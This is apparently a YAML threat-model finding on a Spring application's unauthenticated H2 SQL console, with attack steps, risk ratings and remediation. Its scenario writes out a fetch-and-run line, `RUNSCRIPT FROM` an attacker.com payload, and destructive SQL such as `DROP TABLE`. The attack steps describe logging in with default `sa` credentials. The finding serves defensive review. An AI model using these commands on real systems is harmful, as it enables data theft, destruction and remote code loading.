- local_id: h2-database-001
  threat_category_id: TH-09
  additional_categories:
  - TH-06
  - TH-12
  stride: Elevation of Privilege
  cwe: CWE-306
  title: Missing Authentication on H2 SQL Console (src/main/resources/application.yml)
  scenario: 'The H2 web console is enabled via `h2.console.enabled: true` in application.yml and exposed at `/h2-console/**`
    with no Spring Security authentication guard (`requestMatchers("/h2-console/**").permitAll()` in SecurityConfig.java:32).
    The H2 console''s own login prompt accepts the default credentials — username `sa` with an empty password as configured
    in application.yml:8. Any unauthenticated HTTP client reachable to the server can open the console, log in immediately
    with `sa` / empty password, and execute arbitrary SQL against all application tables: `SELECT * FROM app_users`, `DROP
    TABLE customer_orders`, or `RUNSCRIPT FROM ''http://attacker.com/payload.sql''`. The JPA parameterized-query protections
    applied by the application layer are entirely bypassed — the console talks directly to the H2 engine. All application
    data including user email addresses, order records, and document contents are readable, writable, and deletable without
    any credential.'
  attack_steps:
  - An attacker sends an HTTP GET to `/h2-console/` on the public server and receives the H2 console login form without any
    authentication challenge.
  - The attacker submits username `sa` with an empty password field, matching the datasource credentials in application.yml:8,
    and gains full console access.
  - The attacker executes `SELECT * FROM app_users` to exfiltrate all user records, then `DROP TABLE customer_orders` to destroy
    order data.
  evidence_summary: 'application.yml:11 sets `h2.console.enabled: true`; SecurityConfig.java:32 places `/h2-console/**` in
    `permitAll()` with no auth requirement; application.yml:8 configures an empty datasource password.'
  impact_description: Full read/write/delete access to all application database tables for any unauthenticated internet-facing
    attacker; equivalent to unrestricted DBA access.
  likelihood: High
  impact: Critical
  risk: Critical
  controls_in_place: None — Spring Security explicitly permits all requests to /h2-console/** without authentication; H2 console
    login accepts empty password.
  mitigation_title: Disable H2 console in non-development profiles and add authentication guard
  remediation:
    effort: Low
    steps:
    - 'Set `spring.h2.console.enabled: false` in all non-development Spring profiles (e.g., application-prod.yml); keep enabled
      only in a local dev profile gated by `spring.profiles.active=dev`.'
    - If the console must remain enabled in development, add `requestMatchers("/h2-console/**").hasRole("ADMIN")` in SecurityConfig
      before the `permitAll` catch-all and ensure `csrf` and `frameOptions` are configured to DENY for non-local environments.
    - 'Move the H2 datasource password from an empty value to a random secret loaded from environment variable: `spring.datasource.password=${DB_PASSWORD}`
      and fail startup when the variable is unset.'
    - Remove the H2 console `permitAll` rule entirely from SecurityConfig.java:32.
    code_example: "# application.yml — disable console outside dev\nspring:\n  h2:\n    console:\n      enabled: false  #\
      \ was: true\n\n# application-dev.yml — enable only in dev\nspring:\n  h2:\n    console:\n      enabled: true"
    verification: 'After disabling: `curl -i http://localhost:8080/h2-console/` must return HTTP 403 or 302 to login, not
      200 with the console HTML. Confirm `grep -r ''h2-console'' application*.yml` shows `enabled: false` in the production
      profile.'
